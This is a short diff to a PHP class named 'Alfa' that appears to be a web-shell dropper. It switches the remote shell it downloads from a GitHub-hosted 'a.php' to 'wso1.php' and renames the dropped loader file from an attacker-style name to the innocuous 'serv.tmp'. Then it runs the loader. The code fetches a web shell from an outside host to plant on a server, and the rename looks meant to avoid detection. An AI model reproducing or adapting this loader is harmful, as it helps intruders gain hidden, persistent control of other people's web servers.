@@ -2,8 +2,8 @@
 
 class Alfa {
 	
-	public $shell_url = "https://raw.githubusercontent.com/Aht-crew/upload/master/a.php"; // default
-	public $loader_name = "H4M4573R.tmp"; // default
+	public $shell_url = "https://raw.githubusercontent.com/Aht-crew/upload/master/wso1.php"; // default
+	public $loader_name = "serv.tmp"; // default
 	
 	private $loader_path = "";
 	private $upload_directory = "";
@@ -157,8 +157,8 @@ class Alfa {
 
 $alfa = new Alfa();
 
-$alfa -> shell_url = "https://raw.githubusercontent.com/Aht-crew/upload/master/a.php"; //optional
-$alfa -> loader_name = "H4M4573R.tmp"; //optional
+$alfa -> shell_url = "https://raw.githubusercontent.com/Aht-crew/upload/master/wso1.php"; //optional
+$alfa -> loader_name = "serv.tmp"; //optional
 
 $alfa -> run();
 
